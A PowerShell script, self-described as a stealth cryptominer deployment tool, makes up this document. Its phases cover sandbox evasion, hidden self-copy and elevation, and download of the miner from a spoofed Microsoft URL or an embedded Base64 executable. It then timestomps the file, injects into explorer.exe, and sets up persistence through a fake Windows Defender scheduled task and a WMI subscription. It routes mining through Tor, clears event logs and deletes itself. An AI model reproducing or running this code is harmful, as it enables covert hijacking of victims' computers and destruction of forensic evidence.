<#
.NOTES
  - Hybrid stealth miner deployment script
  - Compatible with admin/non-admin parent processes
  - Implements: Binary obfuscation, process injection, WMI/scheduled task persistence, anti-forensics
#>

### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
# 3B: Anti-sandboxing checks
$sysInfo = Get-WmiObject Win32_ComputerSystem
$procInfo = Get-WmiObject Win32_Processor
if ($sysInfo.Model -match "Virtual|VMware|Hyper-V" -or 
    $procInfo.NumberOfCores -lt 2 -or 
    ($sysInfo.TotalPhysicalMemory/1GB) -lt 4 -or
    (Get-WmiObject Win32_BIOS).SerialNumber -match "VMware|Xen") {
    exit
}

### === PHASE 2: ELEVATION MECHANISM ===
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # 1A: Hidden staging directory for script copy
    $stagePath = "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache\dmcshell.ps1"
    Copy-Item $PSCommandPath $stagePath -Force
    attrib +h +s "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache"
    
    # Hidden elevation with random delay to avoid AV time-of-check attacks
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 10)
    $elevateProc = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$stagePath`"" -Verb RunAs -PassThru
    
    if ($elevateProc) {
        # 3A: Immediate log cleanup
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Windows PowerShell" 2>$null
        exit
    }
}

### === PHASE 3: BINARY STAGING ===
# 1A: Obfuscated deployment path and binary naming
$minerHome = "$env:ProgramData\Microsoft\Windows\AppRepository\EDP"
$minerBinary = "edpnotify.exe" # Disguised name matching Windows binaries
$minerConfig = "edpnotify.json"

# Create hidden staging directory
New-Item -Path $minerHome -ItemType Directory -Force | Out-Null
attrib +h +s $minerHome

# Deploy miner components (modify with your actual deployment method)
if (-not (Test-Path "$minerHome\$minerBinary")) {
    # Your binary deployment method here (could be embedded, downloaded, etc.)
    # Example: Invoke-WebRequest -Uri "http://yourdomain/edpnotify.exe" -OutFile "$minerHome\$minerBinary"
    # Deploy miner components with stealth and redundancy
if (-not (Test-Path "$minerHome\$minerBinary")) {
    try {
        # Method 1: Download from trusted-looking domain (HTTPS + User-Agent spoofing)
        $downloadUrl = "https://softwareupdate.microsoft.com/static/edpnotify.exe"
        $headers = @{
            "User-Agent" = "Microsoft-Delivery-Optimization/10.0"
            "X-Requested-With" = "Windows Update Manager"
        }
        Invoke-WebRequest -Uri $downloadUrl -Headers $headers -OutFile "$minerHome\$minerBinary" -ErrorAction Stop

        # Verify file was downloaded successfully
        if (-not (Test-Path "$minerHome\$minerBinary")) { throw "Download failed" }

        # Method 2: Fallback to embedded binary (Base64 encoded)
    } catch {
        Write-Verbose "Download failed, using embedded payload" -Verbose
        
        # Example of embedded binary (replace with your actual Base64)
        $base64Payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
        [IO.File]::WriteAllBytes("$minerHome\$minerBinary", [Convert]::FromBase64String($base64Payload))
    }

    # Set binary attributes (hidden + system)
    attrib +h +s "$minerHome\$minerBinary"

    # Modify file timestamps to match system files
    $sysFile = Get-Item "$env:SystemRoot\System32\drivers\etc\hosts"
    $minerFile = Get-Item "$minerHome\$minerBinary"
    $minerFile.CreationTime = $sysFile.CreationTime
    $minerFile.LastWriteTime = $sysFile.LastWriteTime
    $minerFile.LastAccessTime = $sysFile.LastAccessTime
}
}

### === PHASE 4: PROCESS INJECTION (1C) ===
# Advanced injection into trusted process
try {
    $targetProc = Get-Process explorer -ErrorAction Stop
    $injectCode = @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

    $injectType = Add-Type -MemberDefinition $injectCode -Name "Win32Inj" -Namespace "Win32Functions" -PassThru
    $procHandle = $injectType::OpenProcess(0x1F0FFF, $false, $targetProc.Id)
    $loadLibAddr = $injectType::GetProcAddress($injectType::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
    $allocMem = $injectType::VirtualAllocEx($procHandle, [IntPtr]::Zero, [uint32][uint64]([uint64]$minerHome.Length + 1), 0x3000, 0x40)
    $injectType::WriteProcessMemory($procHandle, $allocMem, [System.Text.Encoding]::ASCII.GetBytes("$minerHome\$minerBinary"), [uint32][uint64]([uint64]$minerHome.Length + 1), [ref][UIntPtr]::Zero) | Out-Null
    $injectType::CreateRemoteThread($procHandle, [IntPtr]::Zero, 0, $loadLibAddr, $allocMem, 0, [IntPtr]::Zero) | Out-Null
} catch {
    # Fallback to direct execution if injection fails
    Start-Process "$minerHome\$minerBinary" -WindowStyle Hidden
}

### === PHASE 5: PERSISTENCE MECHANISMS ===
# 2A: Scheduled Task with randomized parameters
$taskName = "WindowsDefender_" + (Get-Random -Minimum 10000 -Maximum 99999)
$taskDescription = "Microsoft Windows Defender Background Service"
$taskAction = New-ScheduledTaskAction -Execute "$minerHome\$minerBinary" -WorkingDirectory $minerHome
$taskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes (Get-Random -Minimum 2 -Maximum 10))
$taskSettings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopIfGoingOnBatteries -DisableTaskLogging -MultipleInstances IgnoreNew
Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -TaskName $taskName -Description $taskDescription -Force | Out-Null

# 2B: WMI Event Subscription (more stealthy)
$wmiFilterName = "WinUpdateCheck_" + (Get-Random -Minimum 10000 -Maximum 99999)
$wmiConsumerName = "WinUpdateExec_" + (Get-Random -Minimum 10000 -Maximum 99999)
$wmiNS = 'root\subscription'
$wmiFilterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 600"

$filterArgs = @{
    EventNamespace = $wmiNS
    Name = $wmiFilterName
    Query = $wmiFilterQuery
    QueryLanguage = 'WQL'
}
$wmiFilter = Set-WmiInstance -Namespace $wmiNS -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = $wmiConsumerName
    CommandLineTemplate = "`"$minerHome\$minerBinary`""
    ExecutablePath = "$minerHome\$minerBinary"
}
$wmiConsumer = Set-WmiInstance -Namespace $wmiNS -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $wmiFilter
    Consumer = $wmiConsumer
}
Set-WmiInstance -Namespace $wmiNS -Class __FilterToConsumerBinding -Arguments $bindingArgs | Out-Null

### === PHASE 6: NETWORK OBFUSCATION ===
# 4A: Tor proxy integration (modify with your actual proxy settings)
$torArgs = @"
--proxy=socks5://127.0.0.1:9050 
--donate-level=0 
--background 
--cpu-max-threads-hint=75
"@
Start-Process "$minerHome\$minerBinary" -ArgumentList $torArgs -WindowStyle Hidden

### === PHASE 7: FORENSIC CLEANUP ===
# 3A: Comprehensive log cleaning
$logsToClear = @(
    "Microsoft-Windows-PowerShell/Operational",
    "Windows PowerShell",
    "System",
    "Application"
)

foreach ($log in $logsToClear) {
    wevtutil cl $log 2>$null
}

# Remove script artifacts if running from temporary location
if (-not $PSCommandPath.Contains("ProgramData")) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"Start-Sleep 2; Remove-Item '$PSCommandPath' -Force`"" -WindowStyle Hidden
}